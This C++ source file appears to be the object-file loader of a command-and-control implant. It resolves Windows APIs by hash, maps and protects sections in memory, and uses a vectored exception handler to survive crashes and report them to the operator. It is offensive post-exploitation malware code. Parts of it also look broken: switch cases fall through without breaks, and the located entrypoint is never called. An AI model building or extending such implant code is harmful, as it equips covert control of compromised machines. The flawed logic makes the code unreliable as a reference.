#include <core/include/objects.hpp>
namespace Objects {

    LPVOID WrapperReturn = nullptr;

    _hash_map wrappers[] = {
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
    };

    LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS exception) {

        _stream *stream = Stream::CreateTaskResponse(TypeExecute);

        exception->ContextRecord->IP_REG = (uint64_t)(U_PTR(WrapperReturn));

        Stream::PackDword(stream, ERROR_UNHANDLED_EXCEPTION);
        Stream::PackDword(stream, exception->ExceptionRecord->ExceptionCode);
        Stream::PackPointer(stream, C_PTR(U_PTR(exception->ExceptionRecord->ExceptionAddress)));

        Dispatcher::MessageQueue(stream);

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    VOID FunctionWrapper(void *address, void *args, size_t size) {

        auto function = (obj_entry) address;
        WrapperReturn = __builtin_extract_return_addr(__builtin_return_address(0));

        function((char*)args, size);
    }

    BOOL ProcessSymbol(uint8_t* symbol_data, void** function) {

        uint32_t type_hash  = 0;
        uint32_t lib_hash   = 0;
        uint32_t fn_hash    = 0;

        bool success = true;
        *function = nullptr;

        x_memcpy(&type_hash, symbol_data, sizeof(uint32_t));
        x_memcpy(&fn_hash, symbol_data + sizeof(uint32_t), sizeof(uint32_t));

        switch (type_hash){
            case COFF_INCL_HASH: {

                x_memcpy(&lib_hash, symbol_data + (sizeof(uint32_t) * 2), sizeof(uint32_t));
                C_PTR_HASHES(*function, fn_hash, lib_hash);
            }
            case COFF_HEXANE_HASH: {

                for (auto i = 0;; i++) {
                    if (!wrappers[i].name) {
                        break;
                    }

                    if (fn_hash == wrappers[i].name) {
                        *function = wrappers[i].address;
                        success_(true);
                    }
                }
            }
            case COFF_CONTEXT_HASH: {

                *function = Ctx;
                success_(true);
            }
            default: {
                success_(false);
            }
        }

        defer:
        return success;
    }

    BOOL ExecuteFunction(_executable *object, uint32_t function, void *args, size_t size) {

        void        *veh_handle = { };
        void        *entrypoint = { };
        char        *sym_name   = { };

        uint32_t    protect     = 0;
        uint32_t    bit_mask    = 0;
        bool        success     = true;

        x_assertb(veh_handle = Ctx->nt.RtlAddVectoredExceptionHandler(1, &ExceptionHandler));

        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            object->section = (IMAGE_SECTION_HEADER*) U_PTR(object->buffer) + sizeof(IMAGE_FILE_HEADER) + U_PTR(sizeof(IMAGE_SECTION_HEADER) * sec_index);

            if (object->section->SizeOfRawData > 0) {
                bit_mask = object->section->Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ| IMAGE_SCN_MEM_WRITE);

                switch (bit_mask) {
                case PAGE_NOACCESS:         protect = PAGE_NOACCESS;
                case IMAGE_SCN_MEM_EXECUTE: protect = PAGE_EXECUTE;
                case IMAGE_SCN_MEM_READ:    protect = PAGE_READONLY;
                case IMAGE_SCN_MEM_WRITE:   protect = PAGE_WRITECOPY;
                case IMAGE_SCN_MEM_RX:      protect = PAGE_EXECUTE_READ;
                case IMAGE_SCN_MEM_WX:      protect = PAGE_EXECUTE_WRITECOPY;
                case IMAGE_SCN_MEM_RW:      protect = PAGE_READWRITE;
                case IMAGE_SCN_MEM_RWX:     protect = PAGE_EXECUTE_READWRITE;
                default: success_(false);
                }

                if ((object->section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) == IMAGE_SCN_MEM_NOT_CACHED) {
                    protect |= PAGE_NOCACHE;
                }

                x_ntassertb(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), (void**) &object->sec_map[sec_index].address, &object->sec_map[sec_index].size, protect, nullptr));
            }
        }

        if (object->fn_map->size) {
            x_ntassertb(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), (void**) &object->fn_map, &object->fn_map->size, PAGE_READONLY, nullptr));

            for (auto sym_index = 0; sym_index < object->nt_head->FileHeader.NumberOfSymbols; sym_index++) {
                if (object->symbol[sym_index].First.Value[0]) {
                    sym_name = object->symbol[sym_index].First.Name;
                }
                else {
                    sym_name = (char*)(object->symbol + object->nt_head->FileHeader.NumberOfSymbols) + object->symbol[sym_index].First.Value[1];
                }

                const auto name_hash = Utils::GetHashFromStringA(sym_name, x_strlen(sym_name));

                if (x_memcmp(&name_hash, &function, sizeof(uint32_t)) == 0) {
                    entrypoint = object->sec_map[object->symbol[sym_index].SectionNumber - 1].address + object->symbol[sym_index].Value;
                    break;
                }
            }
        }

        defer:
        return success;
    }
}
